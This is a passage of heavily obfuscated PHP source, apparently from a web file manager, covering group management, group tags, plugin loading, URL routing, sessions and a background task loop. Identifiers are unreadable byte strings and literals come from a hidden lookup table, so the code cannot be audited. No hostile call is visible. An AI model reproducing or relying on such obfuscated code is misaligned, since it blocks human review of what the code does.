$èÈıÄ¿¹ = $this->select(); $èÈıÄ¿¹ = array_to_keyvalue($èÈıÄ¿¹, $œ Šî®Á); foreach ($èÈıÄ¿¹ as $÷Ò‚ “) { $–µâ™’ê = $÷Ò‚ “; $ü‹¾å = array(); while ($–µâ™’ê[$–ŠæÌÛş[441]] != 0) { $ü‹¾å[] = $–µâ™’ê[$–ŠæÌÛş[441]]; $–µâ™’ê = $èÈıÄ¿¹[$–µâ™’ê[$–ŠæÌÛş[441]]]; } $ü‹¾å[] = 0; $ü‹¾å = $–ŠæÌÛş[50] . implode($–ŠæÌÛş[50], array_reverse($ü‹¾å)) . $–ŠæÌÛş[50]; $this->setNamePinyin($÷Ò‚ “[$œ Šî®Á], $÷Ò‚ “[$–ŠæÌÛş[32]]); $this->where(array($œ Šî®Á => $÷Ò‚ “[$œ Šî®Á]))->save(array($–ŠæÌÛş[599] => $ü‹¾å)); } return $èÈıÄ¿¹; } public function groupNameAuto($ ’ÑÄñ‚, $Øëüˆ‡›) { $ğ„Ò£¶ë =& $_SERVER[Ü©»’·]; $Î‡ğ–£ = $this->where(array($ğ„Ò£¶ë[410] => $ ’ÑÄñ‚))->getField($ğ„Ò£¶ë[32], !0); if (!$Î‡ğ–£ || !in_array($Øëüˆ‡›, $Î‡ğ–£)) { return $Øëüˆ‡›; } for ($¼î¬â = 1; $¼î¬â <= count($Î‡ğ–£) + 1; $¼î¬â++) { $±³˜•†± = $Øëüˆ‡› . "\50{$¼î¬â}\51"; if (!in_array($±³˜•†±, $Î‡ğ–£)) { return $±³˜•†±; } } } public function groupSwitch($„à¡ùÄƒ, $üÌßœõ) { $±¤±ŸÂì =& $_SERVER[Ü©»’·]; $ö”¬Ïˆç = array($±¤±ŸÂì[1858] => array($±¤±ŸÂì[7], array($„à¡ùÄƒ, $üÌßœõ))); $—ìÉñÓ = $this->where($ö”¬Ïˆç)->select(); $—ìÉñÓ = array_to_keyvalue($—ìÉñÓ, $±¤±ŸÂì[1858]); if (!isset($—ìÉñÓ[$„à¡ùÄƒ]) || !isset($—ìÉñÓ[$üÌßœõ]) || $—ìÉñÓ[$„à¡ùÄƒ][$±¤±ŸÂì[441]] == 0) { return !1; } $ö”¬Ïˆç = array($±¤±ŸÂì[1858] => $„à¡ùÄƒ); $‹ÎÒÁº« = Model($±¤±ŸÂì[1948])->where($ö”¬Ïˆç)->select(); if (!$‹ÎÒÁº«) { $‹ÎÒÁº« = array(); } foreach ($‹ÎÒÁº« as $ £ ßöÅ) { $¿’èÔ«Ş = $ £ ßöÅ[$±¤±ŸÂì[1669]]; $ö”¬Ïˆç = array($±¤±ŸÂì[1669] => $¿’èÔ«Ş, $±¤±ŸÂì[1858] => $üÌßœõ); $Äğ˜üà = Model($±¤±ŸÂì[1948])->where($ö”¬Ïˆç)->find(); if (!$Äğ˜üà) { $ûöçÂé = array($üÌßœõ => $ £ ßöÅ[$±¤±ŸÂì[1962]]); Model($±¤±ŸÂì[544])->userGroupAdd($¿’èÔ«Ş, $ûöçÂé); } Model($±¤±ŸÂì[544])->userGroupRemove($¿’èÔ«Ş, $„à¡ùÄƒ); } $ö”¬Ïˆç = array($±¤±ŸÂì[420] => 2, $±¤±ŸÂì[441] => 0, $±¤±ŸÂì[419] => 1, $±¤±ŸÂì[514] => array($±¤±ŸÂì[7], array($„à¡ùÄƒ, $üÌßœõ))); $×Š ã™ = Model($±¤±ŸÂì[831])->where($ö”¬Ïˆç)->field($±¤±ŸÂì[1963])->select(); $×Š ã™ = array_to_keyvalue($×Š ã™, $±¤±ŸÂì[514], $±¤±ŸÂì[411]); $ŒÕ…ºû = !empty($×Š ã™[$„à¡ùÄƒ]) ? $×Š ã™[$„à¡ùÄƒ] : !1; if ($ŒÕ…ºû) { if (!$×Š ã™[$üÌßœõ]) { $×Š ã™[$üÌßœõ] = Model($±¤±ŸÂì[831])->groupRootAdd($üÌßœõ); } $Ûş‰¯İ = $×Š ã™[$üÌßœõ]; $ö”¬Ïˆç = array($±¤±ŸÂì[441] => $ŒÕ…ºû); $×Š ã™ = Model($±¤±ŸÂì[831])->where($ö”¬Ïˆç)->field($±¤±ŸÂì[1964])->select(); if (!$×Š ã™) { $×Š ã™ = array(); } Model($±¤±ŸÂì[831])->moveClearAuth = !1; foreach ($×Š ã™ as $§ É¾…Õ) { $·òÏÖ¶Œ = $§ É¾…Õ[$±¤±ŸÂì[419]] == $±¤±ŸÂì[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($±¤±ŸÂì[831])->move($§ É¾…Õ[$±¤±ŸÂì[411]], $Ûş‰¯İ, $·òÏÖ¶Œ); } Model($±¤±ŸÂì[831])->moveClearAuth = !0; $ö”¬Ïˆç = array($±¤±ŸÂì[420] => 2, $±¤±ŸÂì[514] => $„à¡ùÄƒ); $åÓªÈ¹Ë = array($±¤±ŸÂì[514] => $üÌßœõ); Model($±¤±ŸÂì[1965])->where($ö”¬Ïˆç)->save($åÓªÈ¹Ë); Model($±¤±ŸÂì[1966])->where($ö”¬Ïˆç)->save($åÓªÈ¹Ë); } $this->_changeChildLevel($—ìÉñÓ[$„à¡ùÄƒ], $—ìÉñÓ[$üÌßœõ], !0); $this->where(array($±¤±ŸÂì[441] => $„à¡ùÄƒ))->save(array($±¤±ŸÂì[441] => $üÌßœõ)); $this->_clearChildrenCache($—ìÉñÓ[$üÌßœõ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($®ôˆ—“©) { $½æœİîØ =& $_SERVER[Ü©»’·]; return array($½æœİîØ[1967] => array($®ôˆ—“©[0], $½æœİîØ[1968]), $½æœİîØ[1969] => array($®ôˆ—“©[0], $½æœİîØ[1970])); } protected function get($ş¥É¿¹) { $ŒôÙ€¨Ñ =& $_SERVER[Ü©»’·]; $œ”÷ÜÎœ = Model($ŒôÙ€¨Ñ[531])->metaGet($ş¥É¿¹, $ŒôÙ€¨Ñ[1971]); $ÊŒşì†© = json_decode($œ”÷ÜÎœ, !0); return $ÊŒşì†© ? $ÊŒşì†© : array($ŒôÙ€¨Ñ[1972] => $ŒôÙ€¨Ñ[88], $ŒôÙ€¨Ñ[378] => array()); } protected function set($¯ŠÏ„Ìã, $»‰î®ò‹) { $ÎÓŠ¬øó =& $_SERVER[Ü©»’·]; $»‰î®ò‹ = $»‰î®ò‹ ? $»‰î®ò‹ : array($ÎÓŠ¬øó[1972] => $ÎÓŠ¬øó[88], $ÎÓŠ¬øó[378] => array()); return Model($ÎÓŠ¬øó[531])->metaSet($¯ŠÏ„Ìã, $ÎÓŠ¬øó[1971], json_encode($»‰î®ò‹)); } protected function getByTagID($ç×ÆÆ»¡, $îÜ±ƒšù) { $Ó‘ŠÆÕñ =& $_SERVER[Ü©»’·]; if (!$ç×ÆÆ»¡ || !$îÜ±ƒšù) { return !1; } if (!Model($Ó‘ŠÆÕñ[531])->getInfoSimple($ç×ÆÆ»¡)) { return !1; } $ƒ®†¨Ğó = $this->get($ç×ÆÆ»¡); if (!$ƒ®†¨Ğó || !isset($ƒ®†¨Ğó[$Ó‘ŠÆÕñ[378]])) { return !1; } $ø±¾¼ç¦ = array_find_by_field($ƒ®†¨Ğó[$Ó‘ŠÆÕñ[378]], $Ó‘ŠÆÕñ[408], $îÜ±ƒšù); return is_array($ø±¾¼ç¦) ? $ø±¾¼ç¦ : !1; } public function listSource($ŒŒÙ€å‘, $×ƒ‚Ïõí) { $“½êË¢ü =& $_SERVER[Ü©»’·]; if ($×ƒ‚Ïõí && !is_array($×ƒ‚Ïõí)) { $×ƒ‚Ïõí = array($×ƒ‚Ïõí); } $æî„·â¾ = $this->listData($ŒŒÙ€å‘); $±´Œ‰òÇ = array(); foreach ($æî„·â¾ as $’‚ºé”) { $’Õğ©¾Ì = $’‚ºé”[$“½êË¢ü[84]]; if (!$’Õğ©¾Ì) { continue; } if (!isset($±´Œ‰òÇ[$’Õğ©¾Ì])) { $±´Œ‰òÇ[$’Õğ©¾Ì] = array(); } $±´Œ‰òÇ[$’Õğ©¾Ì][] = $’‚ºé”[$“½êË¢ü[435]]; } $Ô×ÎÎ¿ø = array(); foreach ($±´Œ‰òÇ as $ƒšĞ‘«Õ => $¥¹–ßÎ´) { $ŞÏ™© = !0; if (!$×ƒ‚Ïõí) { $Ô×ÎÎ¿ø[] = $ƒšĞ‘«Õ; continue; } foreach ($×ƒ‚Ïõí as $ö‹ºñÀ¬) { if (!in_array($ö‹ºñÀ¬, $¥¹–ßÎ´)) { $ŞÏ™© = !1; break; } } if ($ŞÏ™©) { $Ô×ÎÎ¿ø[] = $ƒšĞ‘«Õ; } } if (!$Ô×ÎÎ¿ø) { return array(); } $ˆ•èÄö× = array($“½êË¢ü[426] => array($“½êË¢ü[427], $Ô×ÎÎ¿ø), $“½êË¢ü[514] => $ŒŒÙ€å‘, $“½êË¢ü[420] => SourceModel::TYPE_GROUP); $äóÍ¨ó‘ = Model($“½êË¢ü[1339])->listSource($ˆ•èÄö×); if (!$äóÍ¨ó‘ || count($Ô×ÎÎ¿ø) == $äóÍ¨ó‘[$“½êË¢ü[375]][$“½êË¢ü[376]]) { return $äóÍ¨ó‘; } $»Å²Ï  = array(); $÷ Ó­ğá = array_to_keyvalue($äóÍ¨ó‘[$“½êË¢ü[82]], $“½êË¢ü[12], $“½êË¢ü[411]); $¡ØÃŞëÓ = array_to_keyvalue($äóÍ¨ó‘[$“½êË¢ü[83]], $“½êË¢ü[12], $“½êË¢ü[411]); $–ãöÛÖ = array_merge($¡ØÃŞëÓ, $÷ Ó­ğá); foreach ($Ô×ÎÎ¿ø as $’Õğ©¾Ì) { if (!in_array($’Õğ©¾Ì, $–ãöÛÖ)) { $»Å²Ï [] = $’Õğ©¾Ì; } } if ($»Å²Ï ) { $this->removeBySource($ŒŒÙ€å‘, $»Å²Ï ); } return $äóÍ¨ó‘; } protected function listData($™õË²ÌÛ) { $©ÈÌï—ì =& $_SERVER[Ü©»’·]; $§ÌÜ’™› = array($©ÈÌï—ì[1660] => 0, $©ÈÌï—ì[493] => array($©ÈÌï—ì[1973], 0), $©ÈÌï—ì[431] => $©ÈÌï—ì[1974] . $™õË²ÌÛ); $»£µ¶–ó = $©ÈÌï—ì[1975]; $’³°ÜÆç = $this->field($»£µ¶–ó)->where($§ÌÜ’™›)->order($©ÈÌï—ì[1976])->select(); return $’³°ÜÆç ? $’³°ÜÆç : array(); } protected function addToTag($Â¥Ü†ª¹, $‰å¹üùö, $š¸İ¹›) { $ÕöïØô¥ =& $_SERVER[Ü©»’·]; if (!$this->getByTagID($Â¥Ü†ª¹, $š¸İ¹›) || !$‰å¹üùö) { return !1; } if (!Model($ÕöïØô¥[831])->pathInfo($‰å¹üùö)) { return !1; } $”ŞÃè¹É = array($ÕöïØô¥[1660] => 0, $ÕöïØô¥[493] => $š¸İ¹›, $ÕöïØô¥[430] => $‰å¹üùö, $ÕöïØô¥[431] => $ÕöïØô¥[1977] . $Â¥Ü†ª¹, $ÕöïØô¥[429] => $ÕöïØô¥[12], $ÕöïØô¥[1862] => 0); if ($this->where($”ŞÃè¹É)->find()) { return !1; } return $this->add($”ŞÃè¹É); } protected function removeFromTag($à»Òï‹ø, $´â…·, $İ˜º¶ÔÁ) { $ ÂÉÓ® =& $_SERVER[Ü©»’·]; if (!$this->getByTagID($à»Òï‹ø, $İ˜º¶ÔÁ) || !$´â…·) { return !1; } if (is_array($´â…·)) { $´â…· = array($ ÂÉÓ®[7], $´â…·); } $ŞË²şœ¼ = array($ ÂÉÓ®[1660] => 0, $ ÂÉÓ®[493] => $İ˜º¶ÔÁ, $ ÂÉÓ®[431] => $ ÂÉÓ®[1977] . $à»Òï‹ø, $ ÂÉÓ®[430] => $´â…·); return $this->where($ŞË²şœ¼)->delete(); } protected function removeByTag($íéÑÎ•, $ıò§©¯ø) { $Á’Ãğáå =& $_SERVER[Ü©»’·]; if (!$this->getByTagID($íéÑÎ•, $ıò§©¯ø)) { return !1; } $±Ù–‹î£ = array($Á’Ãğáå[1660] => 0, $Á’Ãğáå[493] => $ıò§©¯ø, $Á’Ãğáå[431] => $Á’Ãğáå[1977] . $íéÑÎ•); return $this->where($±Ù–‹î£)->delete(); } protected function removeBySource($ÊŞÊš÷ç, $˜ö‰•‚Ç) { $å§–»¶Ù =& $_SERVER[Ü©»’·]; if (!$ÊŞÊš÷ç || !$˜ö‰•‚Ç) { return !1; } if (is_array($˜ö‰•‚Ç)) { $˜ö‰•‚Ç = array($å§–»¶Ù[7], $˜ö‰•‚Ç); } $·Áòó = array($å§–»¶Ù[1660] => 0, $å§–»¶Ù[430] => $˜ö‰•‚Ç, $å§–»¶Ù[493] => array($å§–»¶Ù[1017], 0), $å§–»¶Ù[431] => $å§–»¶Ù[1977] . $ÊŞÊš÷ç); return $this->where($·Áòó)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\160\x6c\x75\147\x69\156\114\x69\163\164"; public $field = array("\x6e\141\155\145", "\163\x74\141\164\x75\163", "\162\145\x67\x69\145\163\164", "\x63\157\156\146\x69\147"); public function loadList($öŸúÖÑì = false) { $³Ö¿ÏÁŞ = array_to_keyvalue($this->listData(), $_SERVER[Ü©»’·][32]); if ($öŸúÖÑì) { return $³Ö¿ÏÁŞ[$öŸúÖÑì]; } return $³Ö¿ÏÁŞ; } public function init() { $Õ¬¥¯ˆ =& $_SERVER[Ü©»’·]; Hook::trigger($Õ¬¥¯ˆ[1978]); $Òåû­ë = $this->loadPluginList(); foreach ($Òåû­ë as $Ğ»óÉŸá => $À¸Ë…Ï†) { $ÈÙºÁ  = $this->appAllow($Ğ»óÉŸá, $À¸Ë…Ï†); if (!$ÈÙºÁ ) { continue; } foreach ($À¸Ë…Ï†[$Õ¬¥¯ˆ[1979]] as $¿âûû± => $ÆˆİÔà¸) { Hook::bind($¿âûû±, $ÆˆİÔà¸); } } Hook::trigger($Õ¬¥¯ˆ[1980]); Hook::trigger(ACTION); } public function appAllow($Ñ†Ãß¢¾, $Ş½ğ•Ä, $ ¢ˆŸ‰Ò = true) { $ †Ù’Ô =& $_SERVER[Ü©»’·]; $ä¤ ¬¯Á = PLUGIN_DIR . $Ñ†Ãß¢¾ . $ †Ù’Ô[1981]; if (!is_array($Ş½ğ•Ä) || !is_array($Ş½ğ•Ä[$ †Ù’Ô[1979]]) || $Ş½ğ•Ä[$ †Ù’Ô[756]] != 1 || !is_file($ä¤ ¬¯Á)) { return !1; } if ($GLOBALS[$ †Ù’Ô[512]] == 1) { if ($GLOBALS[$ †Ù’Ô[6]][$ †Ù’Ô[1982]] || !$GLOBALS[$ †Ù’Ô[6]][$ †Ù’Ô[1983]]) { return !0; } $”Å›Œß = explode($ †Ù’Ô[50], strtolower($GLOBALS[$ †Ù’Ô[6]][$ †Ù’Ô[1983]])); return in_array(strtolower($Ñ†Ãß¢¾), $”Å›Œß) ? !1 : !0; } if ($ ¢ˆŸ‰Ò && !Action($ †Ù’Ô[1984])->checkAuth($Ñ†Ãß¢¾)) { return !1; } return !0; } public function unInstall($ÒÙÀÓÛ) { $™Ï€Ë˜ =& $_SERVER[Ü©»’·]; $ĞßŞ†æ = $this->loadList($ÒÙÀÓÛ); if (file_exists(PLUGIN_DIR . $ÒÙÀÓÛ)) { Hook::apply($ÒÙÀÓÛ . $™Ï€Ë˜[1985]); } $this->remove($ĞßŞ†æ[$™Ï€Ë˜[408]]); } public function changeStatus($¼Œò±‰, $–»ˆÕ©‘) { $õÑ‡É–£ =& $_SERVER[Ü©»’·]; $é‚øã®õ = $this->loadList($¼Œò±‰); if ($–»ˆÕ©‘) { Hook::apply($¼Œò±‰ . $õÑ‡É–£[1986]); } $this->update($é‚øã®õ[$õÑ‡É–£[408]], array($õÑ‡É–£[1987] => $–»ˆÕ©‘)); } public function appRegist($‚–ö­¦, $ÀŞŸü¶ê) { $·úÆŒıé =& $_SERVER[Ü©»’·]; $­¨Ú’ÊÓ = $this->loadList($‚–ö­¦); if ($­¨Ú’ÊÓ) { $this->update($­¨Ú’ÊÓ[$·úÆŒıé[408]], array($·úÆŒıé[1979] => $ÀŞŸü¶ê)); } else { $Ä²êèÅß = array($·úÆŒıé[32] => $‚–ö­¦, $·úÆŒıé[1979] => $ÀŞŸü¶ê, $·úÆŒıé[756] => 0, $·úÆŒıé[6] => $this->getConfigDefault($‚–ö­¦)); $this->insert($Ä²êèÅß); } } public function getConfigDefault($Ê¥‰º³) { $ˆéáæÄã =& $_SERVER[Ü©»’·]; $şô³ä¡Œ = array(); $ß¹–õ×û = $this->getPackageJson($Ê¥‰º³); if (!$ß¹–õ×û && is_array($ß¹–õ×û[$ˆéáæÄã[1988]])) { return $şô³ä¡Œ; } foreach ($ß¹–õ×û[$ˆéáæÄã[1988]] as $ĞúÀˆûó => $‘èéïôâ) { if (!isset($‘èéïôâ[$ˆéáæÄã[383]]) || isset($şô³ä¡Œ[$ĞúÀˆûó])) { continue; } $şô³ä¡Œ[$ĞúÀˆûó] = $‘èéïôâ[$ˆéáæÄã[383]]; } return $şô³ä¡Œ; } public function getPackageJson($Å±Š¥åå) { return Hook::apply($Å±Š¥åå . $_SERVER[Ü©»’·][1989]); } public function getConfig($ËÆ¾Ì¥¹, $êŸé¾úî = false) { $÷«ƒÁä‘ =& $_SERVER[Ü©»’·]; $“°¶Æª = array(); $Ø§ç¨ü = $this->loadList($ËÆ¾Ì¥¹); if ($Ø§ç¨ü && is_array($Ø§ç¨ü[$÷«ƒÁä‘[6]])) { $“°¶Æª = $Ø§ç¨ü[$÷«ƒÁä‘[6]]; } if (!$“°¶Æª || $êŸé¾úî) { $“°¶Æª = $this->getConfigDefault($ËÆ¾Ì¥¹); } return $“°¶Æª; } public function setConfig($„ş…ïÄ, $¹·Û¥º¥ = false) { $ïïÀ¿ï™ =& $_SERVER[Ü©»’·]; $À³Íï¿± = $this->loadList($„ş…ïÄ); if (!$À³Íï¿±) { return !1; } $ï‚ÄÊÃ‡ = $À³Íï¿±[$ïïÀ¿ï™[6]]; if ($¹·Û¥º¥ == !1) { $ï‚ÄÊÃ‡ = array(); $¹·Û¥º¥ = $this->getConfigDefault($„ş…ïÄ); } foreach ($¹·Û¥º¥ as $¯¶êàÕŒ => $·›¬ºÍ¥) { $ï‚ÄÊÃ‡[$¯¶êàÕŒ] = is_string($·›¬ºÍ¥) ? trim($·›¬ºÍ¥) : $·›¬ºÍ¥; } $this->update($À³Íï¿±[$ïïÀ¿ï™[408]], array($ïïÀ¿ï™[6] => $ï‚ÄÊÃ‡)); } public function viewList() { $¨ãã¹áÄ =& $_SERVER[Ü©»’·]; $œß Ğµá = $this->loadList(); $this->pluginScan($œß Ğµá); $œß Ğµá = $this->loadPluginList(); $¿…§®Ÿ = array(); foreach ($œß Ğµá as $Èç¦ÏÃá => $ô¿ìöİ) { unset($ô¿ìöİ[$¨ãã¹áÄ[1979]], $ô¿ìöİ[$¨ãã¹áÄ[6]]); $¨Ù‚»Ã‹ = PLUGIN_DIR . $ô¿ìöİ[$¨ãã¹áÄ[32]] . $¨ãã¹áÄ[1981]; if (!is_file($¨Ù‚»Ã‹)) { continue; } $‡ä­èÛì = Hook::apply($ô¿ìöİ[$¨ãã¹áÄ[32]] . $¨ãã¹áÄ[1989]); if (is_array($‡ä­èÛì)) { $¿…§®Ÿ[$Èç¦ÏÃá] = array_merge($ô¿ìöİ, $‡ä­èÛì); } } return $¿…§®Ÿ; } private function loadPluginList() { $ŸßØ±É™ =& $_SERVER[Ü©»’·]; $Úò—…¡ = $this->loadList(); if (strtolower(MOD) == $ŸßØ±É™[1990]) { return $Úò—…¡; } $ ŞÇ¨´Ø = Hook::trigger($ŸßØ±É™[1991], $Úò—…¡); if ($Úò—…¡ && !$ ŞÇ¨´Ø) { die; } return $ ŞÇ¨´Ø ? $ ŞÇ¨´Ø : $Úò—…¡; } private function pluginScan($í§¢éˆ) { $èÔÌù¡ë =& $_SERVER[Ü©»’·]; recursion_dir(PLUGIN_DIR, $­­ìÙğè, $úæ’áæá, 0); foreach ($­­ìÙğè as $Ä»Õ°€) { $ú‰éÀ¼ş = get_path_this($Ä»Õ°€); if (isset($í§¢éˆ[$ú‰éÀ¼ş]) || !file_exists($Ä»Õ°€ . $èÔÌù¡ë[1992]) || !file_exists($Ä»Õ°€ . $èÔÌù¡ë[1981])) { continue; } Hook::apply($ú‰éÀ¼ş . $èÔÌù¡ë[1986]); } } } goto F—ö’ÃÏ¢é; DåÑ‡Ğê¥Ò: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\x79" => "\133\136\57\x5d\53", "\72\156\165\x6d" => "\133\x30\x2d\x39\x5d\x2b", "\72\x61\154\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($ıİ¨¶ıŒ, $‰Ø”Å•) { $æ¤ÄÔ·Ô =& $_SERVER[Ü©»’·]; if ($ıİ¨¶ıŒ == $æ¤ÄÔ·Ô[1614]) { $ĞŞ¨¸ë = array_map($æ¤ÄÔ·Ô[1615], $‰Ø”Å•[0]); $¡ƒş¨Íœ = strpos($‰Ø”Å•[1], $æ¤ÄÔ·Ô[8]) === 0 ? $‰Ø”Å•[1] : $æ¤ÄÔ·Ô[8] . $‰Ø”Å•[1]; $½«‡§¶ç = $‰Ø”Å•[2]; } else { $ĞŞ¨¸ë = null; $¡ƒş¨Íœ = strpos($‰Ø”Å•[0], $æ¤ÄÔ·Ô[8]) === 0 ? $‰Ø”Å•[0] : $æ¤ÄÔ·Ô[8] . $‰Ø”Å•[0]; $½«‡§¶ç = $‰Ø”Å•[1]; } array_push(self::$maps, $ĞŞ¨¸ë); array_push(self::$routes, $¡ƒş¨Íœ); array_push(self::$methods, strtoupper($ıİ¨¶ıŒ)); array_push(self::$callbacks, $½«‡§¶ç); } public static function error($ô€Œ†Ûà) { self::$errorCallback = $ô€Œ†Ûà; } public static function haltOnMatch($ÄÏ¥‘á© = true) { self::$halts = $ÄÏ¥‘á©; } public static function dispatch() { $§°Úşí =& $_SERVER[Ü©»’·]; $ğ‹ãÌµ = parse_url($_SERVER[$§°Úşí[1616]], PHP_URL_PATH); $À‰‘ú– = $_SERVER[$§°Úşí[159]]; $±ÏØœ™Ò = array_keys(static::$patterns); $İ­“¦Í = array_values(static::$patterns); $èø«ö°» = !1; self::$routes = preg_replace($§°Úşí[1280], $§°Úşí[8], self::$routes); if (in_array($ğ‹ãÌµ, self::$routes)) { $ïÇ¬– = array_keys(self::$routes, $ğ‹ãÌµ); foreach ($ïÇ¬– as $·Şõ“±¬) { if (self::$methods[$·Şõ“±¬] == $À‰‘ú– || self::$methods[$·Şõ“±¬] == $§°Úşí[1617] || in_array($À‰‘ú–, self::$maps[$·Şõ“±¬])) { $èø«ö°» = !0; if (!is_object(self::$callbacks[$·Şõ“±¬])) { $äùÈÎ·¸ = explode($§°Úşí[8], self::$callbacks[$·Şõ“±¬]); $É™ÏÒ˜ = end($äùÈÎ·¸); $á‘òŠŸ¾ = explode($§°Úşí[1212], $É™ÏÒ˜); $…Ö»Š»Ö = new $á‘òŠŸ¾[0](); $…Ö»Š»Ö->{$á‘òŠŸ¾[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$·Şõ“±¬]); if (self::$halts) { return; } } } } } else { $î¹’Ü• = 0; foreach (self::$routes as $·Şõ“±¬) { if (strpos($·Şõ“±¬, $§°Úşí[4]) !== !1) { $·Şõ“±¬ = str_replace($±ÏØœ™Ò, $İ­“¦Í, $·Şõ“±¬); } if (preg_match($§°Úşí[1618] . $·Şõ“±¬ . $§°Úşí[1619], $ğ‹ãÌµ, $èß«Ğà )) { if (self::$methods[$î¹’Ü•] == $À‰‘ú– || self::$methods[$î¹’Ü•] == $§°Úşí[1617] || !empty(self::$maps[$î¹’Ü•]) && in_array($À‰‘ú–, self::$maps[$î¹’Ü•])) { $èø«ö°» = !0; array_shift($èß«Ğà ); if (!is_object(self::$callbacks[$î¹’Ü•])) { $äùÈÎ·¸ = explode($§°Úşí[8], self::$callbacks[$î¹’Ü•]); $É™ÏÒ˜ = end($äùÈÎ·¸); $á‘òŠŸ¾ = explode($§°Úşí[1212], $É™ÏÒ˜); $…Ö»Š»Ö = new $á‘òŠŸ¾[0](); if (!method_exists($…Ö»Š»Ö, $á‘òŠŸ¾[1])) { echo $§°Úşí[1620]; } else { call_user_func_array(array($…Ö»Š»Ö, $á‘òŠŸ¾[1]), $èß«Ğà ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$î¹’Ü•], $èß«Ğà ); if (self::$halts) { return; } } } } $î¹’Ü•++; } } if ($èø«ö°» == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $œãŸ›‡Ü =& $_SERVER[Ü©»’·]; header($_SERVER[$œãŸ›‡Ü[1621]] . $œãŸ›‡Ü[1622]); echo $œãŸ›‡Ü[1623]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$§°Úşí[1616]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $öÑ‡ºÌÙ =& $_SERVER[Ü©»’·]; static $€¤Â‰÷Ù = false; if ($€¤Â‰÷Ù) { return $€¤Â‰÷Ù; } $ı¿š¸†² = $GLOBALS[$öÑ‡ºÌÙ[6]][$öÑ‡ºÌÙ[349]]; self::$sessionTime = $ı¿š¸†²[$öÑ‡ºÌÙ[1624]]; $œ‹œ£Ûí = isset($GLOBALS[$öÑ‡ºÌÙ[1625]]) ? $GLOBALS[$öÑ‡ºÌÙ[1625]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($œ‹œ£Ûí)) { self::$sessionSign = Cookie::get($œ‹œ£Ûí); } else { self::$sessionSign = guid(); } } Cookie::setSafe($œ‹œ£Ûí, self::$sessionSign, self::$sessionTime); $ŞıÌÑú = $ı¿š¸†²[$öÑ‡ºÌÙ[1626]]; $‡ëµù­ = $ı¿š¸†²[$ŞıÌÑú]; $¹ÍÆÉî = $ı¿š¸†²[$öÑ‡ºÌÙ[834]]; switch ($ŞıÌÑú) { case $öÑ‡ºÌÙ[21]: self::$handle = Model($öÑ‡ºÌÙ[835]); break; case $öÑ‡ºÌÙ[836]: self::$handle = new CacheRedis($‡ëµù­, $¹ÍÆÉî); break; case $öÑ‡ºÌÙ[837]: self::$handle = new CacheMemcached($‡ëµù­, $¹ÍÆÉî); break; case $öÑ‡ºÌÙ[199]: $‡ëµù­[$öÑ‡ºÌÙ[84]] = $‡ëµù­[$öÑ‡ºÌÙ[84]] . $öÑ‡ºÌÙ[1627]; self::$handle = new CacheFile($‡ëµù­, $¹ÍÆÉî); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $€¤Â‰÷Ù = new self(); return $€¤Â‰÷Ù; } public static function getBySign($×ˆ†ÁÔÏ) { $Ü£öø±Î = self::$handle->get($×ˆ†ÁÔÏ); $Ü£öø±Î = unserialize($Ü£öø±Î); return is_array($Ü£öø±Î) ? $Ü£öø±Î : array(); } public static function setBySign($Şˆ½³Êî, $ñó¿ñâ) { CacheLock::lock($Şˆ½³Êî); self::$handle->set($Şˆ½³Êî, serialize($ñó¿ñâ), self::$sessionTime); CacheLock::unlock($Şˆ½³Êî); } public static function sign($å¦çı‡· = false) { $å¦çı‡· && (self::$sessionSign = $å¦çı‡·); self::init(); return self::$sessionSign; } public static function set($ñÉ‹¼ê®, $Ñ¦ÆÎšÉ = false) { self::init(); if (is_array($ñÉ‹¼ê®)) { foreach ($ñÉ‹¼ê® as $ç†ÅÄ‡ => $ß¼½° ù) { array_set_value(self::$data, $ç†ÅÄ‡, $ß¼½° ù); } } else { array_set_value(self::$data, $ñÉ‹¼ê®, $Ñ¦ÆÎšÉ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Ã£üƒÉƒ = false) { self::init(); if (!$Ã£üƒÉƒ) { return self::$data; } return array_get_value(self::$data, $Ã£üƒÉƒ); } public static function remove($Ù§ˆ‰Ø¡) { self::init(); unset(self::$data[$Ù§ˆ‰Ø¡]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ü©»’·][839])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ñ¹ª·£í =& $_SERVER[Ü©»’·]; if (self::valueGet($Ñ¹ª·£í[756]) != $Ñ¹ª·£í[88]) { return; } if (self::valueGet($Ñ¹ª·£í[1628]) == $Ñ¹ª·£í[88]) { $ø¨Ìíé¾ = self::valueGet($Ñ¹ª·£í[1629]); if (time() - $ø¨Ìíé¾ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$Ñ¹ª·£í[1630]] = 1; self::valueSet($Ñ¹ª·£í[1628], $Ñ¹ª·£í[88]); self::log($Ñ¹ª·£í[1631] . ACTION . $Ñ¹ª·£í[1632]); Session::$data = array(); Session::$sessionSign = $Ñ¹ª·£í[12]; $GLOBALS[$Ñ¹ª·£í[512]] = 1; Hook::bind($Ñ¹ª·£í[1633], $Ñ¹ª·£í[1634]); $²™™ş› = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ñ¹ª·£í[756]) != $Ñ¹ª·£í[88]) { self::valueSet($Ñ¹ª·£í[1628], $Ñ¹ª·£í[197]); self::log($Ñ¹ª·£í[1635]); die; } 